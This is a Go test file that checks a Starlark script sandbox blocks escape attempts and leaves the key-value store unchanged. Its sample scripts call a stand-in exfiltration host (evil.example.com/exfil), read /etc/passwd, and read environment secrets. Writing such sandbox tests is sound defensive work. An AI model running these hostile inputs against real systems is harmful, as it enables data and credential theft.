package bypass

// Bypass #3 — Starlark I/O Escape
//
// Enforcement: Starlark sandbox via starlark_runner.go (Story 1.6).
//
// Four forbidden operations are tested:
//   1. External HTTP: load("http", ...) — sandbox has no http module,
//      load() calls fail because thread.Load is nil (classifyStarlarkError
//      catches "load not implemented").
//   2. Filesystem read: open("/etc/passwd") — open() is undefined in
//      Starlark's base language and not added to globals; classifies as
//      SandboxViolation ("undefined: open").
//   3. os.Getenv: os.getenv("HOME") — `os` is not in globals; classifies
//      as SandboxViolation ("undefined: os").
//   4. Non-deterministic call: time.now() — `time` is not in globals;
//      classifies as SandboxViolation ("undefined: time").
//
// Each attempt MUST return ScriptError with Code="SandboxViolation" and
// MUST leave NO mutation in Core KV and NO event on core-events.
//
// Report row:
//   Starlark I/O escape | BLOCKED | Starlark sandbox (starlark_runner.go)

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/asolgan/lattice/internal/processor"
)

// TestBypass3_StarlarkHTTPEscape verifies that a script attempting to load
// an external HTTP module is blocked by the sandbox.
//
// go.starlark.net disallows load() because thread.Load is nil
// (starlark_runner.go: "Load is intentionally nil — `load(...)` calls fail").
//
// NOTE on Starlark syntax: `load` statements must be at the TOP LEVEL of a
// Starlark file (not inside a function). A top-level load() attempt produces
// "load not implemented by this application" → SandboxViolation. If placed
// inside a function, Starlark emits a compile-time ScriptError ("load
// statement within a function"). Both cases block execution — the top-level
// form is the realistic attack vector since a top-level load + usage inside
// execute() is the canonical Starlark import pattern.
func TestBypass3_StarlarkHTTPEscape(t *testing.T) {
	// Top-level load() — the realistic attack vector.
	// This returns SandboxViolation ("load not implemented by this application").
	script := `
load("http", "get")
def execute(state, op):
    resp = get("http://evil.example.com/exfil")
    return {"mutations": [], "events": []}
`
	assertSandboxViolation(t, "http-load", script)
	t.Logf("Bypass #3 sub-test 1 BLOCKED: HTTP load() attempt → SandboxViolation")
}

// TestBypass3_StarlarkFilesystemRead verifies that open() is undefined in
// the Starlark sandbox (no filesystem access).
func TestBypass3_StarlarkFilesystemRead(t *testing.T) {
	script := `
def execute(state, op):
    data = open("/etc/passwd").read()
    return {"mutations": [], "events": []}
`
	assertSandboxViolation(t, "filesystem-open", script)
	t.Logf("Bypass #3 sub-test 2 BLOCKED: open('/etc/passwd') → SandboxViolation")
}

// TestBypass3_StarlarkOsGetenv verifies that the `os` module is unavailable
// in the sandbox (no environment variable access).
func TestBypass3_StarlarkOsGetenv(t *testing.T) {
	script := `
def execute(state, op):
    home = os.getenv("HOME")
    return {"mutations": [], "events": []}
`
	assertSandboxViolation(t, "os-getenv", script)
	t.Logf("Bypass #3 sub-test 3 BLOCKED: os.getenv('HOME') → SandboxViolation")
}

// TestBypass3_StarlarkTimeNow verifies that the `time` module is unavailable
// in the sandbox (no non-deterministic calls).
func TestBypass3_StarlarkTimeNow(t *testing.T) {
	script := `
def execute(state, op):
    now = time.now()
    return {"mutations": [], "events": []}
`
	assertSandboxViolation(t, "time-now", script)
	t.Logf("Bypass #3 sub-test 4 BLOCKED: time.now() → SandboxViolation")
}

// TestBypass3_StarlarkNoMutationOnViolation is an end-to-end sub-test
// ensuring that when any of the four forbidden operations is attempted,
// NO mutation is written to Core KV. Even if the script bypassed sandbox
// detection, step 5 returning an error halts the commit path before step 8.
//
// This test uses TestBypass3_StarlarkOsGetenv's script pattern
// (os.getenv) and confirms Core KV is unmodified after the violation.
func TestBypass3_StarlarkNoMutationOnViolation(t *testing.T) {
	ctx, conn := setupBypassHarness(t)

	// The mutation key the rogue script would write if it bypassed the sandbox.
	rogueKey := "vtx.identity." + bypassNanoID1

	// Run the sandboxed script directly through the runner — no need to
	// route via the full CommitPath because the enforcement is in step 5
	// (StarlarkRunner.Run). If Run returns SandboxViolation, the caller
	// (CommitPath.HandleMessage step 5 → step 6 → ... → step 8) never
	// executes; no write to Core KV is possible.
	runner := processor.NewStarlarkRunner(0, 0)
	sc := processor.ScriptContext{
		Operation: &processor.OperationEnvelope{
			RequestID:     bypassNanoID1,
			Lane:          processor.LaneDefault,
			OperationType: "CreateIdentity",
			Actor:         "vtx.identity." + bypassNanoID2,
			SubmittedAt:   "2026-05-14T00:00:00Z",
		},
		Hydrated:  map[string]processor.VertexDoc{},
		DDLLookup: map[string]processor.MetaVertex{},
		ScriptSource: `
def execute(state, op):
    home = os.getenv("HOME")
    return {"mutations": [{"op": "create", "key": "` + rogueKey + `", "document": {"class": "identity"}}], "events": []}
`,
	}

	_, runErr := runner.Run(context.Background(), sc)
	if runErr == nil {
		t.Fatalf("bypass3: expected SandboxViolation error, got nil (BYPASS ESCAPED)")
	}

	var scriptErr *processor.ScriptError
	if !errors.As(runErr, &scriptErr) {
		t.Fatalf("bypass3: expected *ScriptError, got %T: %v", runErr, runErr)
	}
	if scriptErr.Code != "SandboxViolation" {
		t.Fatalf("bypass3: expected Code=SandboxViolation, got %q", scriptErr.Code)
	}

	// CRITICAL: Core KV must NOT have the rogue mutation key.
	if kvPresent(ctx, conn, bypassCoreBucket, rogueKey) {
		t.Fatalf("bypass3: BYPASS ESCAPED: rogue mutation key %q found in Core KV after SandboxViolation", rogueKey)
	}

	t.Logf("Bypass #3 no-mutation check BLOCKED: SandboxViolation returned, Core KV unmodified")
}

// TestBypass3_StarlarkSandbox_AllFourForbiddenOps runs all four forbidden
// operations as subtests and asserts SandboxViolation for each. This is
// the canonical summary test for Bypass #3.
func TestBypass3_StarlarkSandbox_AllFourForbiddenOps(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{
			name: "http-load",
			// Top-level load() — the realistic attack vector. Thread.Load is
			// nil → "load not implemented by this application" → SandboxViolation.
			script: `
load("http", "get")
def execute(state, op):
    return {"mutations": [], "events": []}
`,
		},
		{
			name: "filesystem-open",
			script: `
def execute(state, op):
    f = open("/etc/passwd")
    return {"mutations": [], "events": []}
`,
		},
		{
			name: "os-getenv",
			script: `
def execute(state, op):
    v = os.getenv("SECRET")
    return {"mutations": [], "events": []}
`,
		},
		{
			name: "time-now",
			script: `
def execute(state, op):
    t = time.now()
    return {"mutations": [], "events": []}
`,
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			assertSandboxViolation(t, tc.name, tc.script)
			t.Logf("Bypass #3 [%s]: SandboxViolation confirmed", tc.name)
		})
	}
}

// assertSandboxViolation runs a script via StarlarkRunner and asserts it
// returns a *ScriptError with Code="SandboxViolation". Fails the test if
// the script succeeds or returns a different error code.
func assertSandboxViolation(t *testing.T, name, scriptSource string) {
	t.Helper()
	runner := processor.NewStarlarkRunner(500*time.Millisecond, 100_000)
	sc := processor.ScriptContext{
		Operation: &processor.OperationEnvelope{
			RequestID:     bypassNanoID3,
			Lane:          processor.LaneDefault,
			OperationType: "CreateIdentity",
			Actor:         "vtx.identity." + bypassNanoID2,
			SubmittedAt:   "2026-05-14T00:00:00Z",
		},
		Hydrated:     map[string]processor.VertexDoc{},
		DDLLookup:    map[string]processor.MetaVertex{},
		ScriptSource: scriptSource,
	}

	_, err := runner.Run(context.Background(), sc)
	if err == nil {
		t.Fatalf("bypass3 [%s]: BYPASS ESCAPED: expected SandboxViolation, got nil (script succeeded)", name)
	}

	var scriptErr *processor.ScriptError
	if !errors.As(err, &scriptErr) {
		t.Fatalf("bypass3 [%s]: expected *ScriptError, got %T: %v", name, err, err)
	}
	if scriptErr.Code != "SandboxViolation" {
		t.Fatalf("bypass3 [%s]: expected Code=SandboxViolation, got %q (message: %s)", name, scriptErr.Code, scriptErr.Message)
	}
}
